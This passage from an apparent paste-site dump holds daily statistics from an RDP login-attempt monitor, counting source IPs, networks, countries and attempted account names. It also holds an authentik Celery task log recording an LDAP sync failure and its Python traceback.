    ""UPKONECT CELULAR E TELECOMUNICA\u00c7\u00d5ES EIRE"": 3,
    ""Google LLC"": 18,
    ""''IT FRUIT'' S.R.L."": 9
  },
  ""org"": {
    ""Holdings LLC"": 8336,
    ""Chinanet JS"": 105,
    ""Unknown"": 324,
    ""Bulgarian Telecommunications Company Plc"": 108,
    ""Bresco Broadband"": 141,
    ""Microsoft Azure Cloud (westus)"": 3,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 69,
    ""Chinanet XJ"": 120,
    ""Microsoft Azure Cloud (eastus)"": 153,
    ""Chinanet GS"": 129,
    ""Chang Way Technologies Co. Limited"": 57,
    ""Chinanet ZJ"": 114,
    ""AVAST Software"": 18,
    ""China Mobile Communications Corporation"": 27,
    ""Digital Ocean"": 3,
    ""Censys Inc"": 3,
    ""Xhost Internet Solutions"": 15,
    ""Starcrecium Limited"": 21,
    ""Xhostis"": 6,
    ""FOP Dmytro Nedilskyi"": 33,
    ""TELEF\ufffdNICA BRASIL S.A"": 27,
    ""Linode"": 3,
    ""Chunghwa Telecom Co. Ltd."": 18,
    ""DULIEUAZ"": 30,
    ""DigitalOcean, LLC"": 9,
    ""Cyber Internet Services Pakistan"": 18,
    ""IPS, Inc"": 3,
    ""UPKONECT CELULAR E TELECOMUNICA\u00c7\u00d5ES EIRE"": 3,
    ""Palo Alto Networks, Inc"": 18
  },
  ""regionName"": {
    ""New York"": 8336,
    ""Jiangsu"": 105,
    ""Andalusia"": 9,
    ""Tehran"": 81,
    ""Sofia-Capital"": 108,
    ""Ohio"": 141,
    ""California"": 21,
    ""Sao Paulo"": 99,
    ""Xinjiang Uyghur Autonomous Region"": 120,
    ""Virginia"": 288,
    ""Gansu"": 129,
    ""Moscow"": 87,
    ""Zhejiang"": 192,
    ""Quebec"": 18,
    ""Guangdong"": 27,
    ""New Jersey"": 3,
    ""Michigan"": 3,
    ""North Holland"": 18,
    ""Beijing"": 12,
    ""Kyiv City"": 24,
    ""Kaunas"": 6,
    ""Georgia"": 3,
    ""Taipei City"": 18,
    ""Ho Chi Minh"": 33,
    ""Sindh"": 18,
    ""Metro Manila"": 3,
    ""Chi\u0219in\u0103u Municipality"": 9,
    ""Chechnya"": 3
  },
  ""country"": {
    ""United States"": 8795,
    ""China"": 585,
    ""Spain"": 9,
    ""Iran"": 81,
    ""Bulgaria"": 108,
    ""Brazil"": 99,
    ""Russia"": 90,
    ""Canada"": 18,
    ""Netherlands"": 18,
    ""Ukraine"": 24,
    ""Lithuania"": 6,
    ""Taiwan"": 18,
    ""Vietnam"": 33,
    ""Pakistan"": 18,
    ""Philippines"": 3,
    ""Moldova"": 9
  },
  ""account"": {
    ""hello"": 8564,
    ""142.93.8.59"": 1191,
    ""Domain"": 75,
    ""(empty)"": 3,
    ""Administr"": 57,
    ""Test"": 6,
    ""YDjoJvDdZ"": 3,
    ""doJwsF"": 3,
    ""ZzFXVr"": 3,
    ""BIFdwzGps"": 3,
    ""UAjPxq"": 3,
    ""XDiZnG"": 3
  },
  ""keyboard"": {
    ""Unknown"": 9914
  },
  ""client_build"": {
    ""Unknown"": 9914
  },
  ""client_name"": {
    ""Unknown"": 9914
  },
  ""ip_type"": {
    ""hosting"": 8588,
    ""Unknown"": 1098,
    ""mobile"": 183,
    ""hosting & proxy"": 27,
    ""proxy"": 18
  }
}"
Swan7bZm,2023-07-06_stats.json,rdp_snitch,JSON,Friday 7th of July 2023 07:15:08 PM CDT,"{
  ""ip"": {
    ""192.210.226.140"": 8335,
    ""114.217.18.245"": 105,
    ""85.53.127.115"": 9,
    ""185.66.228.185"": 54,
    ""46.10.214.186"": 108,
    ""69.58.124.234"": 141,
    ""138.91.227.8"": 3,
    ""150.230.79.119"": 48,
    ""120.71.0.5"": 120,
    ""20.42.101.211"": 150,
    ""125.74.93.228"": 129,
    ""92.204.139.79"": 135,
    ""62.122.184.168"": 24,
    ""62.122.184.166"": 24,
    ""36.108.169.132"": 114,
    ""178.21.163.70"": 27,
    ""192.99.110.133"": 18,
    ""36.137.91.143"": 27,
    ""198.211.105.13"": 3,
    ""36.20.126.147"": 78,
    ""162.142.125.216"": 3,
    ""87.251.75.64"": 3,
    ""120.132.17.153"": 12,
    ""185.122.204.28"": 18,
    ""168.138.149.190"": 21,
    ""185.170.144.3"": 6,
    ""31.43.185.32"": 24,
    ""201.93.165.53"": 27,
    ""141.98.11.128"": 6,
    ""62.122.184.38"": 9,
    ""172.105.157.114"": 3,
    ""87.251.75.145"": 3,
    ""60.250.29.35"": 18,
    ""103.195.236.213"": 30,
    ""164.92.158.134"": 9,
    ""87.251.64.110"": 6,
    ""72.255.62.89"": 18,
    ""87.251.75.120"": 3,
    ""45.119.81.119"": 3,
    ""209.146.28.26"": 3,
    ""177.72.147.36"": 3,
    ""205.210.31.31"": 9,
    ""52.152.223.59"": 3,
    ""193.233.21.96"": 9,
    ""185.11.61.117"": 3,
    ""205.210.31.176"": 9
  },
  ""asn"": {
    ""AS36352"": 8335,
    ""AS4134"": 105,
    ""AS12479"": 9,
    ""AS201689"": 54,
    ""AS8866"": 108,
    ""AS32899"": 141,
    ""AS8075"": 156,
    ""AS31898"": 69,
    ""AS137695"": 234,
    ""AS141998"": 129,
    ""AS398108"": 135,
    ""AS57523"": 78,
    ""AS21419"": 27,
    ""AS16276"": 18,
    ""AS9808"": 27,
    ""AS14061"": 12,
    ""AS58461"": 78,
    ""AS398324"": 3,
    ""AS208091"": 9,
    ""AS140292"": 12,
    ""AS48080"": 12,
    ""AS211736"": 24,
    ""AS27699"": 27,
    ""AS209605"": 6,
    ""AS63949"": 3,
    ""AS3462"": 18,
    ""AS140827"": 30,
    ""AS9541"": 18,
    ""AS131386"": 3,
    ""AS135607"": 3,
    ""AS262414"": 3,
    ""AS396982"": 18,
    ""AS56380"": 9
  },
  ""isp"": {
    ""ColoCrossing"": 8335,
    ""Chinanet"": 183,
    ""Uni2 1"": 9,
    ""Lamerd Information & Communication Technology Co., ltd"": 54,
    ""Vivacom Bulgaria EAD"": 108,
    ""Bresco Broadband"": 141,
    ""Microsoft Corporation"": 156,
    ""Oracle Corporation"": 69,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 234,
    ""China Telecom"": 129,
    ""GoDaddy.com, LLC"": 135,
    ""Chang Way Technologies Co. Limited"": 78,
    ""Pishtaze E Jadid Infomration Company"": 27,
    ""OVH SAS"": 18,
    ""China Mobile"": 27,
    ""DigitalOcean, LLC"": 12,
    ""Censys, Inc."": 3,
    ""XHOST-INTERNET-SOLUTIONS"": 9,
    ""Addresses CNNIC"": 12,
    ""Dmitriy Panchenko"": 12,
    ""FOP Dmytro Nedilskyi"": 24,
    ""Vivo"": 27,
    ""UAB Host Baltic"": 6,
    ""Akamai Technologies, Inc."": 3,
    ""Chunghwa Telecom Co., Ltd."": 18,
    ""AZ Viet NAM Communications Technology Company Limited"": 30,
    ""Cyber Internet Services (Private) Limited"": 18,
    ""Long Van System Solution"": 3,
    ""Cogent Communications"": 3,
    ""UPKONECT CELULAR E TELECOMUNICA\u00c7\u00d5ES EIRE"": 3,
    ""Google LLC"": 18,
    ""''IT FRUIT'' S.R.L."": 9
  },
  ""org"": {
    ""Holdings LLC"": 8335,
    ""Chinanet JS"": 105,
    ""Unknown"": 324,
    ""Bulgarian Telecommunications Company Plc"": 108,
    ""Bresco Broadband"": 141,
    ""Microsoft Azure Cloud (westus)"": 3,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 69,
    ""Chinanet XJ"": 120,
    ""Microsoft Azure Cloud (eastus)"": 153,
    ""Chinanet GS"": 129,
    ""Chang Way Technologies Co. Limited"": 57,
    ""Chinanet ZJ"": 114,
    ""AVAST Software"": 18,
    ""China Mobile Communications Corporation"": 27,
    ""Digital Ocean"": 3,
    ""Censys Inc"": 3,
    ""Xhost Internet Solutions"": 15,
    ""Starcrecium Limited"": 21,
    ""Xhostis"": 6,
    ""FOP Dmytro Nedilskyi"": 33,
    ""TELEF\ufffdNICA BRASIL S.A"": 27,
    ""Linode"": 3,
    ""Chunghwa Telecom Co. Ltd."": 18,
    ""DULIEUAZ"": 30,
    ""DigitalOcean, LLC"": 9,
    ""Cyber Internet Services Pakistan"": 18,
    ""IPS, Inc"": 3,
    ""UPKONECT CELULAR E TELECOMUNICA\u00c7\u00d5ES EIRE"": 3,
    ""Palo Alto Networks, Inc"": 18
  },
  ""regionName"": {
    ""New York"": 8335,
    ""Jiangsu"": 105,
    ""Andalusia"": 9,
    ""Tehran"": 81,
    ""Sofia-Capital"": 108,
    ""Ohio"": 141,
    ""California"": 21,
    ""Sao Paulo"": 99,
    ""Xinjiang Uyghur Autonomous Region"": 120,
    ""Virginia"": 288,
    ""Gansu"": 129,
    ""Moscow"": 87,
    ""Zhejiang"": 192,
    ""Quebec"": 18,
    ""Guangdong"": 27,
    ""New Jersey"": 3,
    ""Michigan"": 3,
    ""North Holland"": 18,
    ""Beijing"": 12,
    ""Kyiv City"": 24,
    ""Kaunas"": 6,
    ""Georgia"": 3,
    ""Taipei City"": 18,
    ""Ho Chi Minh"": 33,
    ""Sindh"": 18,
    ""Metro Manila"": 3,
    ""Chi\u0219in\u0103u Municipality"": 9,
    ""Chechnya"": 3
  },
  ""country"": {
    ""United States"": 8794,
    ""China"": 585,
    ""Spain"": 9,
    ""Iran"": 81,
    ""Bulgaria"": 108,
    ""Brazil"": 99,
    ""Russia"": 90,
    ""Canada"": 18,
    ""Netherlands"": 18,
    ""Ukraine"": 24,
    ""Lithuania"": 6,
    ""Taiwan"": 18,
    ""Vietnam"": 33,
    ""Pakistan"": 18,
    ""Philippines"": 3,
    ""Moldova"": 9
  },
  ""account"": {
    ""hello"": 8563,
    ""142.93.8.59"": 1191,
    ""Domain"": 75,
    ""(empty)"": 3,
    ""Administr"": 57,
    ""Test"": 6,
    ""YDjoJvDdZ"": 3,
    ""doJwsF"": 3,
    ""ZzFXVr"": 3,
    ""BIFdwzGps"": 3,
    ""UAjPxq"": 3,
    ""XDiZnG"": 3
  },
  ""keyboard"": {
    ""Unknown"": 9913
  },
  ""client_build"": {
    ""Unknown"": 9913
  },
  ""client_name"": {
    ""Unknown"": 9913
  },
  ""ip_type"": {
    ""hosting"": 8587,
    ""Unknown"": 1098,
    ""mobile"": 183,
    ""hosting & proxy"": 27,
    ""proxy"": 18
  }
}"
EHGFRtfQ,Untitled,AndrewBucklin,JSON,Friday 7th of July 2023 06:57:42 PM CDT,"[
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10334,
    ""task_id"": ""373c696b-1af9-48c9-a4db-6e6b0eaf77db"",
    ""task_name"": ""ldap_sync_single"",
    ""timestamp"": ""2023-07-07T23:48:25.582685""
  },
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10333,
    ""task_id"": ""7578862d-f27c-45ef-8f98-014bbc65a1f3"",
    ""task_name"": ""event_notification_handler"",
    ""timestamp"": ""2023-07-07T23:48:25.594055""
  },
  {
    ""event"": ""Task published"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10333,
    ""task_id"": ""ce2f6aca-0b4a-40f7-a9d0-4038254479b1"",
    ""task_name"": ""authentik.events.tasks.event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:25.634574""
  },
  {
    ""event"": ""Task published"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10333,
    ""task_id"": ""98784d15-6a3c-41ed-bb7f-e84c1ad68c81"",
    ""task_name"": ""authentik.events.tasks.event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:25.636555""
  },
  {
    ""event"": ""Task published"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10333,
    ""task_id"": ""61ea5575-61e4-41ba-a3f4-1234b8840cfd"",
    ""task_name"": ""authentik.events.tasks.event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:25.638471""
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10333,
    ""state"": ""SUCCESS"",
    ""task_id"": ""7578862d-f27c-45ef-8f98-014bbc65a1f3"",
    ""task_name"": ""event_notification_handler"",
    ""timestamp"": ""2023-07-07T23:48:25.641141""
  },
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10335,
    ""task_id"": ""ce2f6aca-0b4a-40f7-a9d0-4038254479b1"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:25.640837""
  },
  {
    ""checker"": ""passes_action"",
    ""event"": ""Event matcher check result"",
    ""level"": ""info"",
    ""logger"": ""authentik.policies.event_matcher.models"",
    ""pid"": 10335,
    ""result"": ""<PolicyResult passing=False messages=('Action matched.',)>"",
    ""task_id"": ""task-ce2f6aca0b4a40f7a9d04038254479b1"",
    ""timestamp"": ""2023-07-07T23:48:25.732945""
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10335,
    ""state"": ""SUCCESS"",
    ""task_id"": ""ce2f6aca-0b4a-40f7-a9d0-4038254479b1"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:25.741521""
  },
  {
    ""event"": ""Task failure"",
    ""exc"": ""AttributeError(\""'UUID' object has no attribute 'connection'\"")"",
    ""level"": ""warning"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10334,
    ""task_id"": ""task-373c696b1af948c9a4db6e6b0eaf77db"",
    ""timestamp"": ""2023-07-07T23:48:25.867896""
  },
  {
    ""action"": ""system_exception"",
    ""client_ip"": null,
    ""context"": {
      ""message"": ""Traceback (most recent call last):\n  File \""/usr/local/lib/python3.11/site-packages/celery/app/trace.py\"", line 477, in trace_task\n    R = retval = fun(*args, **kwargs)\n                 ^^^^^^^^^^^^^^^^^^^^\n  File \""/usr/local/lib/python3.11/site-packages/sentry_sdk/integrations/celery.py\"", line 275, in _inner\n    reraise(*exc_info)\n  File \""/usr/local/lib/python3.11/site-packages/sentry_sdk/_compat.py\"", line 60, in reraise\n    raise value\n  File \""/usr/local/lib/python3.11/site-packages/sentry_sdk/integrations/celery.py\"", line 270, in _inner\n    return f(*args, **kwargs)\n           ^^^^^^^^^^^^^^^^^^\n  File \""/usr/local/lib/python3.11/site-packages/celery/app/trace.py\"", line 760, in __protected_call__\n    return self.run(*args, **kwargs)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \""/authentik/sources/ldap/tasks.py\"", line 42, in ldap_sync_single\n    ldap_sync_paginator(source, UserLDAPSynchronizer)\n  File \""/authentik/sources/ldap/tasks.py\"", line 55, in ldap_sync_paginator\n    sync_inst: BaseLDAPSynchronizer = sync(source)\n                                      ^^^^^^^^^^^^\n  File \""/authentik/sources/ldap/sync/base.py\"", line 29, in __init__\n    self._connection = source.connection()\n                       ^^^^^^^^^^^^^^^^^\nbuiltins.AttributeError: 'UUID' object has no attribute 'connection'""
    },
    ""event"": ""Created Event"",
    ""level"": ""info"",
    ""logger"": ""authentik.events.models"",
    ""pid"": 10334,
    ""timestamp"": ""2023-07-07T23:48:25.870133"",
    ""user"": {}
  },
  {
    ""event"": ""Task published"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10334,
    ""task_id"": ""b45b05d8-7fb4-4891-adf8-e0e14ea1e4f9"",
    ""task_name"": ""authentik.events.tasks.event_notification_handler"",
    ""timestamp"": ""2023-07-07T23:48:25.912180""
  },
  {
    ""event"": ""Task authentik.sources.ldap.tasks.ldap_sync_single[373c696b-1af9-48c9-a4db-6e6b0eaf77db] raised unexpected: AttributeError(\""'UUID' object has no attribute 'connection'\"")"",
    ""exc_info"": [
      ""<class 'AttributeError'>"",
      ""AttributeError(\""'UUID' object has no attribute 'connection'\"")"",
      ""<billiard.einfo.Traceback object at 0x7f7deba78190>""
    ],
    ""level"": ""error"",
    ""logger"": ""celery.app.trace"",
    ""timestamp"": 1688773705.9130294
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10334,
    ""state"": ""FAILURE"",
    ""task_id"": ""373c696b-1af9-48c9-a4db-6e6b0eaf77db"",
    ""task_name"": ""ldap_sync_single"",
    ""timestamp"": ""2023-07-07T23:48:25.913260""
  },
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10339,
    ""task_id"": ""98784d15-6a3c-41ed-bb7f-e84c1ad68c81"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:26.335855""
  },
  {
    ""checker"": ""passes_action"",
    ""event"": ""Event matcher check result"",
    ""level"": ""info"",
    ""logger"": ""authentik.policies.event_matcher.models"",
    ""pid"": 10339,
    ""result"": ""<PolicyResult passing=False messages=('Action matched.',)>"",
    ""task_id"": ""task-98784d156a3c41edbb7fe84c1ad68c81"",
    ""timestamp"": ""2023-07-07T23:48:26.400083""
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10339,
    ""state"": ""SUCCESS"",
    ""task_id"": ""98784d15-6a3c-41ed-bb7f-e84c1ad68c81"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:26.408206""
  },
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10341,
    ""task_id"": ""b45b05d8-7fb4-4891-adf8-e0e14ea1e4f9"",
    ""task_name"": ""event_notification_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.442961""
  },
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10342,
    ""task_id"": ""61ea5575-61e4-41ba-a3f4-1234b8840cfd"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.442958""
  },
  {
    ""event"": ""Task published"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10341,
    ""task_id"": ""eea0b27b-3cc6-4bbe-bd25-40ff0ee625e3"",
    ""task_name"": ""authentik.events.tasks.event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.495114""
  },
  {
    ""event"": ""Task published"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10341,
    ""task_id"": ""c0b57754-23e4-410a-875a-67b32aa8be9f"",
    ""task_name"": ""authentik.events.tasks.event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.496959""
  },
  {
    ""event"": ""Task published"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10341,
    ""task_id"": ""41292260-c6dd-4124-a8bf-22a7d764d5d5"",
    ""task_name"": ""authentik.events.tasks.event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.498974""
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10341,
    ""state"": ""SUCCESS"",
    ""task_id"": ""b45b05d8-7fb4-4891-adf8-e0e14ea1e4f9"",
    ""task_name"": ""event_notification_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.502737""
  },
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10343,
    ""task_id"": ""c0b57754-23e4-410a-875a-67b32aa8be9f"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.508156""
  },
  {
    ""checker"": ""passes_action"",
    ""event"": ""Event matcher check result"",
    ""level"": ""info"",
    ""logger"": ""authentik.policies.event_matcher.models"",
    ""pid"": 10342,
    ""result"": ""<PolicyResult passing=False messages=('Action matched.',)>"",
    ""task_id"": ""task-61ea557561e441baa3f41234b8840cfd"",
    ""timestamp"": ""2023-07-07T23:48:27.515969""
  },
  {
    ""checker"": ""passes_action"",
    ""event"": ""Event matcher check result"",
    ""level"": ""info"",
    ""logger"": ""authentik.policies.event_matcher.models"",
    ""pid"": 10342,
    ""result"": ""<PolicyResult passing=False messages=('Action matched.',)>"",
    ""task_id"": ""task-61ea557561e441baa3f41234b8840cfd"",
    ""timestamp"": ""2023-07-07T23:48:27.526643""
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10342,
    ""state"": ""SUCCESS"",
    ""task_id"": ""61ea5575-61e4-41ba-a3f4-1234b8840cfd"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.532823""
  },
  {
    ""checker"": ""passes_action"",
    ""event"": ""Event matcher check result"",
    ""level"": ""info"",
    ""logger"": ""authentik.policies.event_matcher.models"",
    ""pid"": 10343,
    ""result"": ""<PolicyResult passing=False messages=('Action matched.',)>"",
    ""task_id"": ""task-c0b5775423e4410a875a67b32aa8be9f"",
    ""timestamp"": ""2023-07-07T23:48:27.568338""
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10343,
    ""state"": ""SUCCESS"",
    ""task_id"": ""c0b57754-23e4-410a-875a-67b32aa8be9f"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:27.574551""
  },
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10347,
    ""task_id"": ""eea0b27b-3cc6-4bbe-bd25-40ff0ee625e3"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:28.575128""
  },
  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10348,
    ""task_id"": ""41292260-c6dd-4124-a8bf-22a7d764d5d5"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:28.575128""
  },
  {
    ""checker"": ""passes_action"",
    ""event"": ""Event matcher check result"",
    ""level"": ""info"",
    ""logger"": ""authentik.policies.event_matcher.models"",
    ""pid"": 10348,
    ""result"": ""<PolicyResult passing=False messages=('Action matched.',)>"",
    ""task_id"": ""task-41292260c6dd4124a8bf22a7d764d5d5"",
    ""timestamp"": ""2023-07-07T23:48:28.650010""
  },
  {
    ""checker"": ""passes_action"",
    ""event"": ""Event matcher check result"",
    ""level"": ""info"",
    ""logger"": ""authentik.policies.event_matcher.models"",
    ""pid"": 10347,
    ""result"": ""<PolicyResult passing=False messages=('Action matched.',)>"",
    ""task_id"": ""task-eea0b27b3cc64bbebd2540ff0ee625e3"",
    ""timestamp"": ""2023-07-07T23:48:28.650010""
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10347,
    ""state"": ""SUCCESS"",
    ""task_id"": ""eea0b27b-3cc6-4bbe-bd25-40ff0ee625e3"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:28.657057""
  },
  {
    ""checker"": ""passes_action"",
    ""event"": ""Event matcher check result"",
    ""level"": ""info"",
    ""logger"": ""authentik.policies.event_matcher.models"",
    ""pid"": 10348,
    ""result"": ""<PolicyResult passing=False messages=('Action matched.',)>"",
    ""task_id"": ""task-41292260c6dd4124a8bf22a7d764d5d5"",
    ""timestamp"": ""2023-07-07T23:48:28.658633""
  },
  {
    ""event"": ""Task finished"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 10348,
    ""state"": ""SUCCESS"",
    ""task_id"": ""41292260-c6dd-4124-a8bf-22a7d764d5d5"",
    ""task_name"": ""event_trigger_handler"",
    ""timestamp"": ""2023-07-07T23:48:28.665930""
  }
]"
